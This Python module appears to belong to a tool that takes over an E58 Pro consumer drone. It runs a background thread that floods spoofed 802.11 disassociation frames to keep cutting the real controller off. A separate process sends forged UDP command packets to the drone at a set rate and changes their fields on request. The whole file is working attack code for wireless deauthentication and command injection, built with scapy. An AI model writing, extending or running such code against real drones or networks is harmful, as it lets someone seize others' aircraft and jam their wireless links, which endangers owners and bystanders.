from __future__ import annotations

from multiprocessing import Process, Queue as MPQueue, Event as MPEvent
from queue import Empty, Full
from threading import Thread, Event as TEvent

from time import sleep, perf_counter
from typing import NamedTuple, Callable, Any, Optional

import logging
import os

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Disas
from scapy.layers.inet import UDP
from scapy.packet import Packet

from e58pro.command_payloads import new_video_ack, E58ProBasePayload


DEAUTH_REASON = 0x03
SEND_DURATION = 1314  # 1314 microseconds. Arbitrary? Stolen from airodump captures.
DEAUTH_SUBTYPE = 12

# Can be either DOT11Deauth or Dot11Disas
DOT11_DISCONNECT_TYPE = Dot11Disas

DEAUTHS_PER_SECOND = 20


PROCESS_NAME = "TransmitterProcess"


class CommandRequest(NamedTuple):
    field_modifications: dict[str, Any]
    n_to_send: int = 1
    persist_new_state: bool = False
    additional_layers: list[Packet] = ()


NEUTRAL_COMMAND_REQUEST = CommandRequest({}, persist_new_state=True)


# TODO: Add logging and include PID formatter specifier.

def _new_sequence_control(frag: int, seq: int) -> int:
    return (seq << 4) + frag


def _new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Disas:
    sc = _new_sequence_control(0, seq_num)
    return RadioTap(present="Rate+TXFlags") / \
           Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
           DOT11_DISCONNECT_TYPE(reason=reason)


def _start_disassociator(interface_name: str,
                         sender_l4_base: UDP,
                         sender_func: Callable,
                         termination_event: TEvent
                         ) -> None:
    """Starts a thread that attempts to constantly disassociate the connection between the controller and drone
     represented by the passed layer 4 datagram base.
    The thread terminates when the passed Event is set.
    """
    drone_mac = sender_l4_base[Dot11].addr1
    controller_mac = sender_l4_base[Dot11].addr2
    deauth = _new_deauth(controller_mac, drone_mac, drone_mac, 1, DEAUTH_REASON)

    def deauth_loop():
        seq = 0
        while not termination_event.is_set():
            sender_func(deauth, iface=interface_name, verbose=False)
            deauth[Dot11].SC = _new_sequence_control(0, seq)
            seq += 1
            if seq >= 0x1000:
                seq = 0
            sleep(1 / DEAUTHS_PER_SECOND)

    thread = Thread(target=deauth_loop)
    thread.start()


def _modify_command(command: E58ProBasePayload, modifications: dict[str, Any]) -> None:
    for field_name, new_field_value in modifications.items():
        command.setfieldval(field_name, new_field_value)


def _add_layers(base_command: E58ProBasePayload, additional_layers: list[Packet]) -> None:
    acc = base_command
    for layer in additional_layers:
        acc /= layer


def _transmission_routine(interface_name: str,
                          sends_per_second: int,
                          command_request_queue: MPQueue,
                          termination_event: MPEvent,
                          sender_l4_base: UDP,
                          sender_func: Callable,
                          **sender_func_kwargs) -> None:
    """Starts a thread to disassociate the identified controller from the drone. It then periodically sends bursts
    of command datagrams; potentially modifying them by popping from the queue and applying any requested
    modifications.
    Terminates when the passed termination event is set."""
    logging.basicConfig(filename="child_process.log",
                        format="%(asctime)s: %(levelname)s at %(filename)s/%(funcName)s: %(message)s",
                        level=logging.INFO)

    logging.info(f"PID: {os.getpid()}")

    _start_disassociator(interface_name, sender_l4_base, sender_func, termination_event)
    persisted_state = sender_l4_base / new_video_ack(0)
    seq = 0
    while not termination_event.is_set():
        start_time = perf_counter()
        try:
            request: CommandRequest = command_request_queue.get(block=False)
        except Empty:
            request = NEUTRAL_COMMAND_REQUEST

        mods = request.field_modifications
        add_layers = request.additional_layers

        command = persisted_state if request.persist_new_state else persisted_state.copy()
        n_to_send = request.n_to_send
        if mods:
            _modify_command(command, mods)
        if add_layers:
            _add_layers(command, add_layers)

        command[E58ProBasePayload].setfieldval("sequence_number", seq)  # TODO: Check if it even cares about the seq.
        sender_func(command * n_to_send, iface=interface_name, verbose=False, **sender_func_kwargs)
        seq += 1
        if seq > 0xFFFFFFFF:
            seq = 0

        end_time = perf_counter()
        elapsed = (end_time - start_time)
        sleep_time = (1 / sends_per_second) * n_to_send - elapsed
        if sleep_time > 0:
            sleep(sleep_time)
        else:
            logging.warning("Warning:  Took too long to send! Attempting to send every "
                            f"{1 / sends_per_second}, but are taking {elapsed:.3} to send!")


class TransmitterProcessController:
    """Manages the periodic sending of commands.
    Requests to modify commands before they're sent can be submitted using the send_request method.
    """
    def __init__(self,
                 interface_name: str,
                 sends_per_second: int,
                 sender_l4_base: UDP,
                 sender_func: Callable,
                 max_queue_size: Optional[int] = None
                 ):
        max_queue_size = max_queue_size if max_queue_size is not None else sends_per_second
        self._command_request_queue = MPQueue(max_queue_size)
        self._termination_event = MPEvent()

        self._process = Process(target=_transmission_routine,
                                name=PROCESS_NAME,
                                args=(interface_name, sends_per_second,
                                      self._command_request_queue, self._termination_event,
                                      sender_l4_base, sender_func),
                                daemon=True)

    def start(self):
        self._process.start()

    def shutdown(self) -> None:
        self._termination_event.set()
        self._command_request_queue.close()

    def send_request(self,
                     field_modifications: dict[str, Any],
                     n_to_send: int = 1,
                     persist_new_state: bool = False,
                     additional_layers: list[Packet] = ()
                     ) -> bool:
        """Queues a request to send a command.
        Returns whether or not the request was successful. Will fail if the sender is backlogged."""
        try:
            self._command_request_queue.put(CommandRequest(field_modifications,
                                                           n_to_send,
                                                           persist_new_state,
                                                           additional_layers))
            return True

        except Full:
            return False

    def __enter__(self) -> TransmitterProcessController:
        self.start()
        return self

    def __exit__(self, *_) -> None:
        self.shutdown()
